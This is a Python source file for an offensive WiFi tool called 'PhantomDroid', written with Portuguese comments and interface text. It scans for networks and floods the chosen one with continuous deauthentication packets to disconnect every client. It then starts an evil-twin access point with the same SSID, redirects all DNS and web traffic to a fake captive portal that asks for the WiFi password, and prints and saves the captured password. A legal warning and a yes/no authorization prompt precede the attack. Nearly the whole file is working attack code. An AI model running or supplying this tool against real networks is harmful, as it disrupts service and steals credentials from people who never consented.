"""
PhantomDroid — WiFi Deauth + Evil Twin + Captive Portal
Fluxo:
  1. Escaneia redes WiFi disponíveis
  2. Usuário seleciona a rede alvo
  3. Deauth → todos os dispositivos desconectam
  4. Sobe um AP falso com o mesmo SSID (Evil Twin)
  5. Dispositivos conectam no AP falso automaticamente
  6. Portal captivo intercepta a senha quando o usuário digita
  7. Exibe a senha capturada no terminal
⚠ Apenas para uso em redes próprias / com autorização explícita.
Author: Mr. Psycho | @the_psycho_of_hackers
"""

import subprocess
import re
import os
import sys
import time
import threading
import platform
import socket
import tempfile
import http.server
import urllib.parse
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt, Confirm
from rich import box

console = Console()

# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS DE INTERFACE
# ══════════════════════════════════════════════════════════════════════════════

def _get_iface_linux() -> str:
    try:
        out = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT,
                                      text=True, timeout=5)
        for line in out.splitlines():
            if "IEEE 802.11" in line or "ESSID" in line:
                return line.split()[0]
    except Exception:
        pass
    return "wlan0"


def _get_iface_windows() -> str:
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True,
            encoding="utf-8", errors="ignore", timeout=10
        )
        for line in result.stdout.splitlines():
            m = re.match(r"\s*(?:Nome|Name)\s*:\s*(.+)", line)
            if m:
                return m.group(1).strip()
    except Exception:
        pass
    return "Wi-Fi"


def _get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "192.168.1.1"


# ══════════════════════════════════════════════════════════════════════════════
#  SCAN DE REDES
# ══════════════════════════════════════════════════════════════════════════════

def scan_networks_windows() -> list:
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            capture_output=True, text=True,
            encoding="utf-8", errors="ignore", timeout=15
        )
        output = result.stdout
    except Exception as e:
        console.print(f"[red]Erro ao escanear redes: {e}[/]")
        return []

    networks, current = [], {}
    for line in output.splitlines():
        line = line.strip()
        m = re.match(r"SSID\s+\d+\s*:\s*(.+)", line)
        if m:
            if current:
                networks.append(current)
            current = {"ssid": m.group(1).strip(), "bssid": "N/A",
                       "signal": "N/A", "channel": "6", "security": "N/A"}
        m = re.match(r"BSSID\s+\d+\s*:\s*([0-9a-fA-F:]{17})", line)
        if m and current:
            current["bssid"] = m.group(1).upper()
        m = re.match(r"(?:Sinal|Signal)\s*:\s*(\d+)%", line)
        if m and current:
            current["signal"] = m.group(1) + "%"
        m = re.match(r"(?:Canal|Channel)\s*:\s*(\d+)", line)
        if m and current:
            current["channel"] = m.group(1)
        m = re.match(r"(?:Autenticação|Authentication)\s*:\s*(.+)", line)
        if m and current:
            current["security"] = m.group(1).strip()
    if current:
        networks.append(current)
    return networks


def scan_networks_linux() -> list:
    networks = []
    try:
        result = subprocess.run(
            ["nmcli", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY",
             "dev", "wifi", "list"],
            capture_output=True, text=True, timeout=15
        )
        for line in result.stdout.splitlines()[1:]:
            parts = line.split()
            if len(parts) >= 2 and parts[0] != "--":
                networks.append({
                    "ssid":     parts[0],
                    "bssid":    parts[1] if len(parts) > 1 else "N/A",
                    "signal":   parts[2] + "%" if len(parts) > 2 else "N/A",
                    "channel":  parts[3] if len(parts) > 3 else "6",
                    "security": parts[4] if len(parts) > 4 else "N/A",
                })
        if networks:
            return networks
    except FileNotFoundError:
        pass
    try:
        iface = _get_iface_linux()
        result = subprocess.run(["iwlist", iface, "scan"],
                                capture_output=True, text=True, timeout=20)
        current = {}
        for line in result.stdout.splitlines():
            line = line.strip()
            if "Cell" in line and "Address:" in line:
                if current:
                    networks.append(current)
                current = {"ssid": "?", "bssid": line.split("Address:")[-1].strip(),
                           "signal": "N/A", "channel": "6", "security": "N/A"}
            elif "ESSID:" in line and current:
                current["ssid"] = line.split("ESSID:")[-1].strip().strip('"')
            elif "Quality=" in line and current:
                s = re.search(r"Signal level=(-?\d+)", line)
                if s:
                    current["signal"] = s.group(1) + " dBm"
            elif "Channel:" in line and current:
                c = re.search(r"Channel:(\d+)", line)
                if c:
                    current["channel"] = c.group(1)
        if current:
            networks.append(current)
    except Exception:
        pass
    return networks


def scan_networks() -> list:
    if platform.system().lower() == "windows":
        return scan_networks_windows()
    return scan_networks_linux()


# ══════════════════════════════════════════════════════════════════════════════
#  DISPLAY
# ══════════════════════════════════════════════════════════════════════════════

def _print_networks_table(networks: list):
    t = Table(
        title="[bold magenta]📡 Redes WiFi Disponíveis[/]",
        box=box.DOUBLE_EDGE, border_style="magenta",
        header_style="bold cyan", show_lines=True,
    )
    t.add_column("#",         style="bold cyan", width=4,  no_wrap=True)
    t.add_column("SSID",      style="bold white", min_width=18)
    t.add_column("BSSID",     style="yellow",     width=19)
    t.add_column("Sinal",     style="green",      width=8)
    t.add_column("Canal",     style="cyan",       width=7)
    t.add_column("Segurança", style="dim",        min_width=10)

    for i, net in enumerate(networks, 1):
        signal = net.get("signal", "N/A")
        pct_m  = re.match(r"(\d+)%", signal)
        if pct_m:
            pct   = int(pct_m.group(1))
            color = "green" if pct >= 70 else ("yellow" if pct >= 40 else "red")
            signal_str = f"[{color}]{signal}[/]"
        else:
            signal_str = signal
        t.add_row(str(i), net.get("ssid","?"), net.get("bssid","N/A"),
                  signal_str, net.get("channel","6"), net.get("security","N/A"))
    console.print(t)


# ══════════════════════════════════════════════════════════════════════════════
#  DEAUTH ENGINE
# ══════════════════════════════════════════════════════════════════════════════

def _deauth_scapy(bssid: str, iface: str, count: int = 128,
                  interval: float = 0.03) -> bool:
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    except ImportError:
        console.print("[red]✗ Scapy não instalado:[/] pip install scapy")
        return False
    pkt = (RadioTap() /
           Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) /
           Dot11Deauth(reason=7))
    try:
        sendp(pkt, iface=iface, count=count, inter=interval, verbose=False)
        return True
    except Exception as e:
        console.print(f"[red]Deauth scapy error: {e}[/]")
        return False


def _deauth_aireplay(bssid: str, iface: str, count: int = 20) -> bool:
    try:
        result = subprocess.run(
            ["aireplay-ng", "--deauth", str(count), "-a", bssid,
             "--ignore-negative-one", iface],
            capture_output=True, text=True, timeout=60
        )
        return result.returncode == 0
    except (FileNotFoundError, Exception):
        return False


def _run_deauth_forever(bssid: str, mon_iface: str, stop_event: threading.Event):
    """Envia deauth continuamente até stop_event ser acionado."""
    console.print(f"[bold red]⚡ Deauth contínuo ativo — mantendo todos desconectados...[/]")
    burst = 0
    while not stop_event.is_set():
        burst += 1
        ok = _deauth_aireplay(bssid, mon_iface, count=30)
        if not ok:
            _deauth_scapy(bssid, mon_iface, count=128, interval=0.03)
        console.print(f"  [dim red]► Rafada #{burst} enviada[/]")
        time.sleep(2)


# ══════════════════════════════════════════════════════════════════════════════
#  MONITOR MODE
# ══════════════════════════════════════════════════════════════════════════════

def _enable_monitor_mode(iface: str) -> str:
    if platform.system().lower() == "windows":
        return iface
    console.print(f"[cyan]Ativando monitor mode em {iface}...[/]")
    try:
        subprocess.run(["airmon-ng", "check", "kill"],
                       capture_output=True, timeout=10)
        result = subprocess.run(["airmon-ng", "start", iface],
                                capture_output=True, text=True, timeout=15)
        m = re.search(r"monitor mode (?:vif )?enabled (?:for|on) (\w+)",
                      result.stdout)
        mon = m.group(1) if m else iface + "mon"
        console.print(f"[green]✓ Monitor mode:[/] {mon}")
        return mon
    except FileNotFoundError:
        pass
    try:
        subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
        subprocess.run(["iw", iface, "set", "monitor", "none"], capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
        console.print(f"[green]✓ Monitor mode (iw):[/] {iface}")
        return iface
    except Exception as e:
        console.print(f"[yellow]⚠ Falha no monitor mode: {e}[/]")
        return iface


def _disable_monitor_mode(mon_iface: str, orig_iface: str):
    if platform.system().lower() == "windows":
        return
    try:
        subprocess.run(["airmon-ng", "stop", mon_iface],
                       capture_output=True, timeout=10)
    except FileNotFoundError:
        try:
            subprocess.run(["ip", "link", "set", mon_iface, "down"],
                           capture_output=True)
            subprocess.run(["iw", mon_iface, "set", "type", "managed"],
                           capture_output=True)
            subprocess.run(["ip", "link", "set", mon_iface, "up"],
                           capture_output=True)
        except Exception:
            pass
    console.print("[green]✓ Interface restaurada.[/]")


# ══════════════════════════════════════════════════════════════════════════════
#  EVIL TWIN — AP FALSO
# ══════════════════════════════════════════════════════════════════════════════

def _write_hostapd_conf(ssid: str, channel: str, iface: str) -> str:
    """Gera arquivo de configuração do hostapd (AP aberto sem senha)."""
    conf = (
        f"interface={iface}\n"
        f"driver=nl80211\n"
        f"ssid={ssid}\n"
        f"hw_mode=g\n"
        f"channel={channel}\n"
        f"macaddr_acl=0\n"
        f"ignore_broadcast_ssid=0\n"
    )
    path = os.path.join(tempfile.gettempdir(), "phantom_hostapd.conf")
    with open(path, "w") as f:
        f.write(conf)
    return path


def _write_dnsmasq_conf(iface: str, gateway_ip: str) -> str:
    """Gera configuração do dnsmasq (DHCP + DNS redirect para o portal)."""
    conf = (
        f"interface={iface}\n"
        f"dhcp-range=192.168.1.2,192.168.1.254,255.255.255.0,12h\n"
        f"dhcp-option=3,{gateway_ip}\n"
        f"dhcp-option=6,{gateway_ip}\n"
        f"server=8.8.8.8\n"
        f"log-queries\n"
        f"log-dhcp\n"
        f"address=/#/{gateway_ip}\n"   # redireciona TUDO para o portal
    )
    path = os.path.join(tempfile.gettempdir(), "phantom_dnsmasq.conf")
    with open(path, "w") as f:
        f.write(conf)
    return path


def _start_evil_twin_linux(ssid: str, channel: str, ap_iface: str,
                            gateway_ip: str = "192.168.1.1") -> tuple:
    """
    Sobe hostapd + dnsmasq no Linux.
    Retorna (proc_hostapd, proc_dnsmasq) para encerrar depois.
    """
    # Configura IP na interface AP
    subprocess.run(["ip", "addr", "flush", "dev", ap_iface], capture_output=True)
    subprocess.run(["ip", "addr", "add", f"{gateway_ip}/24", "dev", ap_iface],
                   capture_output=True)
    subprocess.run(["ip", "link", "set", ap_iface, "up"], capture_output=True)

    # hostapd
    hostapd_conf = _write_hostapd_conf(ssid, channel, ap_iface)
    try:
        proc_hostapd = subprocess.Popen(
            ["hostapd", hostapd_conf],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(2)
        console.print(f"[green]✓ AP falso '[bold]{ssid}[/]' ativo em {ap_iface}[/]")
    except FileNotFoundError:
        console.print("[red]✗ hostapd não encontrado:[/] sudo apt install hostapd")
        return None, None

    # dnsmasq
    dnsmasq_conf = _write_dnsmasq_conf(ap_iface, gateway_ip)
    try:
        proc_dnsmasq = subprocess.Popen(
            ["dnsmasq", "-C", dnsmasq_conf, "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        console.print("[green]✓ DHCP/DNS ativo (dnsmasq)[/]")
    except FileNotFoundError:
        console.print("[red]✗ dnsmasq não encontrado:[/] sudo apt install dnsmasq")
        proc_hostapd.terminate()
        return None, None

    return proc_hostapd, proc_dnsmasq


# ══════════════════════════════════════════════════════════════════════════════
#  PORTAL CAPTIVO — SERVIDOR HTTP
# ══════════════════════════════════════════════════════════════════════════════

# Senha capturada (compartilhada entre threads)
_captured_password: str = ""
_capture_event      = threading.Event()

PORTAL_HTML = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Autenticação de Rede Wi-Fi</title>
<style>
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:#f0f4f8;font-family:Arial,sans-serif;
       display:flex;align-items:center;justify-content:center;min-height:100vh}}
  .card{{background:#fff;border-radius:16px;padding:36px 32px;
         box-shadow:0 4px 24px rgba(0,0,0,.12);max-width:400px;width:90%;text-align:center}}
  .logo{{font-size:3em;margin-bottom:8px}}
  h2{{color:#1a1a2e;margin-bottom:4px;font-size:1.3em}}
  p{{color:#666;font-size:.9em;margin-bottom:24px}}
  .net{{background:#f7f7f7;border-radius:8px;padding:10px 14px;
        display:flex;align-items:center;gap:10px;margin-bottom:20px;text-align:left}}
  .net .ssid{{font-weight:bold;color:#1a1a2e;font-size:1em}}
  .net .mac{{color:#999;font-size:.75em}}
  input{{width:100%;padding:12px 14px;border:1.5px solid #ddd;border-radius:8px;
         font-size:1em;margin-bottom:16px;outline:none;transition:.2s}}
  input:focus{{border-color:#4a90e2}}
  button{{width:100%;padding:13px;background:#4a90e2;color:#fff;border:none;
          border-radius:8px;font-size:1em;font-weight:bold;cursor:pointer;transition:.2s}}
  button:hover{{background:#357abd}}
  .err{{color:#e74c3c;font-size:.85em;margin-bottom:12px;display:none}}
  .footer{{margin-top:16px;color:#bbb;font-size:.75em}}
</style>
</head>
<body>
<div class="card">
  <div class="logo">📶</div>
  <h2>Autenticação necessária</h2>
  <p>Para continuar conectado, confirme a senha da rede Wi-Fi.</p>
  <div class="net">
    <span>🔒</span>
    <div>
      <div class="ssid">{ssid}</div>
      <div class="mac">Segurança: WPA2-Personal</div>
    </div>
  </div>
  <form method="POST" action="/auth">
    <input type="password" name="pwd" placeholder="Senha do Wi-Fi" required autofocus>
    <div class="err" id="err">Senha incorreta. Tente novamente.</div>
    <button type="submit">Conectar</button>
  </form>
  <div class="footer">Powered by Network Manager</div>
</div>
</body>
</html>"""

SUCCESS_HTML = """<!DOCTYPE html>
<html lang="pt-BR">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Conectado</title>
<style>
  body{{background:#f0f4f8;font-family:Arial,sans-serif;
       display:flex;align-items:center;justify-content:center;min-height:100vh}}
  .card{{background:#fff;border-radius:16px;padding:40px 32px;
         box-shadow:0 4px 24px rgba(0,0,0,.12);max-width:360px;width:90%;text-align:center}}
  .ico{{font-size:4em;margin-bottom:12px}}
  h2{{color:#27ae60;margin-bottom:8px}}
  p{{color:#666;font-size:.9em}}
</style>
</head>
<body>
<div class="card">
  <div class="ico">✅</div>
  <h2>Conectado com sucesso!</h2>
  <p>Sua rede foi autenticada.<br>Você pode fechar esta janela.</p>
</div>
</body>
</html>"""


class _CaptivePortalHandler(http.server.BaseHTTPRequestHandler):
    ssid: str = "Network"

    def _send_html(self, html: str, code: int = 200):
        body = html.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        # Captive portal detection — redirecionar qualquer domínio para nós
        self.send_header("Location", f"http://192.168.1.1/")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        self._send_html(PORTAL_HTML.format(ssid=self.ssid))

    def do_POST(self):
        global _captured_password
        length  = int(self.headers.get("Content-Length", 0))
        body    = self.rfile.read(length).decode("utf-8", errors="ignore")
        params  = urllib.parse.parse_qs(body)
        pwd     = params.get("pwd", [""])[0].strip()
        client_ip = self.client_address[0]

        if pwd:
            _captured_password = pwd
            _capture_event.set()
            console.print(
                f"\n[bold green blink]🔑 SENHA INTERCEPTADA![/]\n"
                f"  [bold white]Rede :[/] [yellow]{self.ssid}[/]\n"
                f"  [bold white]Senha:[/] [bold green]{pwd}[/]\n"
                f"  [bold white]De   :[/] {client_ip}"
            )
            self._send_html(SUCCESS_HTML.format(ssid=self.ssid))
        else:
            self._send_html(PORTAL_HTML.format(ssid=self.ssid))

    def log_message(self, fmt, *args):
        client = self.client_address[0]
        console.print(f"  [dim]📱 Conexão: {client} → {self.path}[/]")


def _run_captive_portal(ssid: str, port: int = 80):
    """Inicia o servidor HTTP do portal captivo."""
    _CaptivePortalHandler.ssid = ssid
    try:
        server = http.server.HTTPServer(("0.0.0.0", port), _CaptivePortalHandler)
        server.timeout = 1
        console.print(f"[green]✓ Portal captivo ativo na porta {port}[/]")
        while not _capture_event.is_set():
            server.handle_request()
        # Atende mais algumas requests para mostrar a página de sucesso
        for _ in range(10):
            server.handle_request()
        server.server_close()
    except PermissionError:
        console.print(
            f"[red]✗ Porta {port} requer privilégios de root.[/]\n"
            "[yellow]Execute com sudo ou use --portal-port 8080[/]"
        )
    except Exception as e:
        console.print(f"[red]Portal erro: {e}[/]")


# ══════════════════════════════════════════════════════════════════════════════
#  IPTABLES — REDIRECIONAR HTTP PARA PORTAL
# ══════════════════════════════════════════════════════════════════════════════

def _setup_iptables(ap_iface: str, portal_port: int = 80):
    """Redireciona todo tráfego HTTP do AP para o portal captivo."""
    rules = [
        ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", ap_iface,
         "-p", "tcp", "--dport", "80",  "-j", "REDIRECT", "--to-port", str(portal_port)],
        ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", ap_iface,
         "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(portal_port)],
        ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", ap_iface,
         "-j", "MASQUERADE"],
    ]
    for r in rules:
        subprocess.run(r, capture_output=True)
    # Habilita IP forwarding
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
    console.print("[green]✓ Redirect HTTP/HTTPS → portal ativo (iptables)[/]")


def _clear_iptables():
    subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)


# ══════════════════════════════════════════════════════════════════════════════
#  MENU PRINCIPAL
# ══════════════════════════════════════════════════════════════════════════════

def wifi_deauth_menu():
    """
    Fluxo completo Evil Twin + Captive Portal:
      Scan → Seleciona → Deauth contínuo → AP Falso → Portal → Senha Capturada
    """
    global _captured_password
    _captured_password = ""
    _capture_event.clear()

    console.rule("[bold magenta]📶 Evil Twin — Interceptação de Senha Wi-Fi[/]")

    console.print(Panel(
        "[bold red]⚠  AVISO LEGAL[/]\n\n"
        "[white]Este módulo realiza um ataque Evil Twin + Captive Portal.\n"
        "Cria um AP falso, desconecta dispositivos e intercepta credenciais.\n"
        "O uso sem autorização explícita é [bold red]ILEGAL[/] "
        "e sujeito a penalidades criminais.\n"
        "Use APENAS em redes próprias ou com permissão por escrito.[/]",
        border_style="red", padding=(0, 2)
    ))

    if not Confirm.ask(
        "[bold red]Confirmo que tenho autorização para atacar esta rede[/]",
        default=False
    ):
        console.print("[yellow]Operação cancelada.[/]")
        return

    # ── 1. SCAN ───────────────────────────────────────────────────────────────
    console.print("\n[cyan]Escaneando redes WiFi disponíveis...[/]")
    with console.status("[bold cyan]Aguarde...[/]"):
        networks = scan_networks()

    if not networks:
        console.print("[bold red]✗ Nenhuma rede encontrada.[/]")
        return

    console.print(f"[green]✓ {len(networks)} rede(s) encontrada(s).[/]\n")
    _print_networks_table(networks)

    # ── 2. SELEÇÃO ────────────────────────────────────────────────────────────
    choices = [str(i) for i in range(1, len(networks) + 1)]
    choice  = Prompt.ask("\n[bold cyan]Selecione o número da rede alvo[/]",
                         choices=choices)
    target  = networks[int(choice) - 1]
    bssid   = target.get("bssid", "N/A")
    ssid    = target.get("ssid", "?")
    channel = target.get("channel", "6")

    if bssid == "N/A":
        console.print("[red]✗ BSSID não disponível para esta rede.[/]")
        return

    console.print(Panel(
        f"[bold white]SSID:[/]   [bold yellow]{ssid}[/]\n"
        f"[bold white]BSSID:[/]  [bold yellow]{bssid}[/]\n"
        f"[bold white]Canal:[/]  {channel}",
        title="[bold red]🎯 Alvo Selecionado[/]", border_style="red"
    ))

    os_name = platform.system().lower()

    if os_name == "windows":
        _run_windows_mode(ssid, bssid)
        return

    # ── LINUX FLOW ────────────────────────────────────────────────────────────

    orig_iface = _get_iface_linux()

    # Verifica se há segunda interface (para AP)
    console.print("\n[cyan]Interfaces de rede disponíveis:[/]")
    subprocess.run(["iwconfig"], capture_output=False)

    ap_iface = Prompt.ask(
        "\n[cyan]Interface para o AP falso[/] "
        "(pode ser a mesma ou uma segunda, ex: wlan1)",
        default=orig_iface
    )
    mon_iface = Prompt.ask(
        "[cyan]Interface para monitor/deauth[/] "
        "(preferencialmente diferente, ex: wlan0mon)",
        default=orig_iface + "mon"
    )

    console.print(Panel(
        f"  [cyan]1.[/] Ativando monitor mode em [bold]{orig_iface}[/]\n"
        f"  [cyan]2.[/] Deauth contínuo → desconecta dispositivos de [bold yellow]{ssid}[/]\n"
        f"  [cyan]3.[/] AP falso '[bold yellow]{ssid}[/]' sobe em [bold]{ap_iface}[/]\n"
        f"  [cyan]4.[/] Portal captivo intercepta a senha\n\n"
        "[dim]Pressione Ctrl+C para encerrar.[/]",
        title="[bold magenta]🚀 Iniciando Ataque[/]",
        border_style="magenta", padding=(0, 2)
    ))

    # Ativa monitor mode para deauth
    mon_iface = _enable_monitor_mode(orig_iface)

    # Stop event para parar o deauth quando senha for capturada
    stop_deauth = threading.Event()

    # Thread 1: Deauth contínuo
    deauth_t = threading.Thread(
        target=_run_deauth_forever,
        args=(bssid, mon_iface, stop_deauth),
        daemon=True
    )
    deauth_t.start()

    time.sleep(3)  # deixa o deauth começar antes de subir o AP

    # Thread 2: Sobe AP falso (hostapd + dnsmasq)
    proc_hostapd, proc_dnsmasq = _start_evil_twin_linux(
        ssid, channel, ap_iface, gateway_ip="192.168.1.1"
    )

    if not proc_hostapd:
        stop_deauth.set()
        _disable_monitor_mode(mon_iface, orig_iface)
        return

    # Configura iptables para redirecionar ao portal
    _setup_iptables(ap_iface, portal_port=80)

    # Thread 3: Portal captivo
    portal_t = threading.Thread(
        target=_run_captive_portal,
        args=(ssid, 80),
        daemon=True
    )
    portal_t.start()

    console.print("\n[bold green]✅ Ataque ativo![/]")
    console.print(f"[dim]Aguardando dispositivos conectarem ao AP falso "
                  f"e digitarem a senha...[/]\n")

    try:
        # Aguarda captura ou Ctrl+C
        while not _capture_event.is_set():
            time.sleep(1)

    except KeyboardInterrupt:
        console.print("\n[yellow]Interrompido pelo usuário.[/]")

    finally:
        # Limpeza
        stop_deauth.set()
        if proc_hostapd:
            proc_hostapd.terminate()
        if proc_dnsmasq:
            proc_dnsmasq.terminate()
        _clear_iptables()
        _disable_monitor_mode(mon_iface, orig_iface)

    # ── RESULTADO ─────────────────────────────────────────────────────────────
    if _captured_password:
        console.print(Panel(
            f"[bold green]✓ SENHA CAPTURADA COM SUCESSO![/]\n\n"
            f"  [bold white]Rede :[/]  [bold yellow]{ssid}[/]\n"
            f"  [bold white]BSSID:[/]  {bssid}\n"
            f"  [bold white]Senha:[/]  [bold green blink]{_captured_password}[/]",
            title="[bold green]🔓 Credencial Interceptada[/]",
            border_style="green", padding=(1, 4)
        ))
        result_file = f"phantom_captured_{ssid.replace(' ', '_')}.txt"
        with open(result_file, "w") as f:
            f.write(f"SSID:  {ssid}\nBSSID: {bssid}\nSENHA: {_captured_password}\n")
        console.print(f"[dim]Salvo em: {result_file}[/]")
    else:
        console.print("[yellow]Nenhuma senha capturada.[/]")


# ══════════════════════════════════════════════════════════════════════════════
#  MODO WINDOWS (limitado — sem hostapd)
# ══════════════════════════════════════════════════════════════════════════════

def _run_windows_mode(ssid: str, bssid: str):
    """
    No Windows, hostapd não está disponível nativamente.
    Usa 'netsh wlan' para criar um hosted network + portal HTTP.
    Requer adaptador com suporte a hosted network.
    """
    iface = _get_iface_windows()

    console.print(Panel(
        "[bold yellow]ℹ Modo Windows[/]\n\n"
        "Usando [bold]netsh wlan[/] para criar o AP falso.\n"
        "Requer: adaptador com suporte a Hosted Network.\n\n"
        "Se falhar, use uma VM Linux com Kali.",
        border_style="yellow", padding=(0, 2)
    ))

    # Cria hosted network com o mesmo SSID
    subprocess.run(
        ["netsh", "wlan", "set", "hostednetwork",
         f"ssid={ssid}", "key=00000000", "mode=allow"],
        capture_output=True
    )
    result = subprocess.run(
        ["netsh", "wlan", "start", "hostednetwork"],
        capture_output=True, text=True, encoding="utf-8", errors="ignore"
    )

    if "started" in result.stdout.lower() or "iniciada" in result.stdout.lower():
        console.print(f"[green]✓ AP falso '[bold]{ssid}[/]' ativo![/]")
    else:
        console.print(
            f"[yellow]⚠ Hosted network pode não ter iniciado.[/]\n"
            f"[dim]{result.stdout.strip()}[/]"
        )

    # Deauth via Scapy
    stop_deauth = threading.Event()
    deauth_t = threading.Thread(
        target=_run_deauth_forever,
        args=(bssid, iface, stop_deauth),
        daemon=True
    )
    deauth_t.start()

    # Portal captivo na porta 8080 (não precisa de root no Windows)
    portal_t = threading.Thread(
        target=_run_captive_portal,
        args=(ssid, 8080),
        daemon=True
    )
    portal_t.start()

    local_ip = _get_local_ip()
    console.print(Panel(
        f"[bold green]✅ Ataque ativo![/]\n\n"
        f"[white]Portal captivo:[/] [bold cyan]http://{local_ip}:8080[/]\n"
        f"[white]Aguardando dispositivos conectarem e digitarem a senha...[/]\n\n"
        "[dim]Pressione Ctrl+C para encerrar.[/]",
        border_style="magenta"
    ))

    try:
        while not _capture_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrompido.[/]")
    finally:
        stop_deauth.set()
        subprocess.run(["netsh", "wlan", "stop", "hostednetwork"],
                       capture_output=True)

    if _captured_password:
        console.print(Panel(
            f"[bold green]✓ SENHA CAPTURADA![/]\n\n"
            f"  [bold white]Rede :[/]  [bold yellow]{ssid}[/]\n"
            f"  [bold white]Senha:[/]  [bold green blink]{_captured_password}[/]",
            title="[bold green]🔓 Credencial Interceptada[/]",
            border_style="green", padding=(1, 4)
        ))
        result_file = f"phantom_captured_{ssid.replace(' ', '_')}.txt"
        with open(result_file, "w") as f:
            f.write(f"SSID:  {ssid}\nBSSID: {bssid}\nSENHA: {_captured_password}\n")
        console.print(f"[dim]Salvo em: {result_file}[/]")
    else:
        console.print("[yellow]Nenhuma senha capturada.[/]")
